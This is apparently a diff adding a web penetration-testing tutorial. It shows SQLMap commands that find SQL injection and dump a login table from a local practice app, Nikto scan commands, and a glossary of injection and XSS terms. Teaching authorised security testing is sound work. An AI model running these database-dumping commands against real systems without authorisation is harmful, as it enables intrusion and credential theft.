@@ -1,0 +1,89 @@
+Fully automated tools are designed for specific purposes including testing specific vulnerabilities or testing specific products.
+
+1) Testing For Specific Vulnerabilities - A web application may have a huge testing scope. Fully-Automated tools can test thousands of test cases and payloads specific to one vulnerability on various pages.
+
+2) Testing For Specific Products - Web servers, database servers, and application frameworks like WordPress have specific features that make them vulnerable to attack. Each of these requires specific testing which can be time-consuming to set up manually. Fully-Automated tools can do this efficiently.
+
+Using SQLMap For Testing SQL Injection:
+
+SQLMap is a fully-automated tool used to test a request for SQL Injections. It can perform over 400+ checks using various SQL injection techniques. Though this tool can be used independently using the --url parameter, It is advised to use BurpSuite to capture a request and then use the parameter to provide a text file containing the captured request. This ensures that SQLMap gets many additional elements like request headers, cookies, data fields, the request method, etc.
+
+1) Open (http://sbva.local/login.php)http://sbva.local/login.php(opens in a new tab) and capture the request in BurpSuite.
+
+2) Replace the testing parameter's values with an asterisk (*) sign and save the request to a file req.txt
+
+3) Open a terminal and type sqlmap -hh for the extended help menu
+
+4) Allow SQLMap to analyze the request using sqlmap -r req.txt (Answer the questions accordingly)
+
+Using SQLMap to Exfiltrate Data:
+
+1) Extract all databases on the web application using sqlmap -r req.txt --dbs
+
+2) Select the database named sbva and extract all tables using sqlmap -r req.txt -D sbva_main --tables
+
+3) Dump the login table using sqlmap -r req.txt -D sbva_main -T login --dump
+
+Using Nikto To Audit Web Server Security:
+
+Nikto is a fully automated tool to test web server security.
+
+1) To install Nikto (it is pre-installed on Kali Linux), run: apt-get install nikto -y
+
+2) To use Nikto, use the command: nikto -host <IP address>
+
+3) Nikto also has a detailed help menu that can be accessed from: nikto --help
+
+New Terms:
+
+Command Injection: An attack where malicious commands are directly executed on the system hosting the application
+
+Commix: A fully automated tool used to test an application against command injection vulnerabilities
+
+Cross-Site Scripting (XSS): An attack where scripts (typically written in javascript) are executed in the user's browser when an infected element is loaded
+
+Nikto: A fully automated tool used to audit the web server security
+
+SQL Injection: An attack where malicious SQL queries are inserted into an input field and executed by the database management system
+
+SQLmap: A fully automated tool used to test an application against SQL injection vulnerabilities
+
+XSS Strike: A fully automated tool used to test an application against cross-site scripting vulnerabilities
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
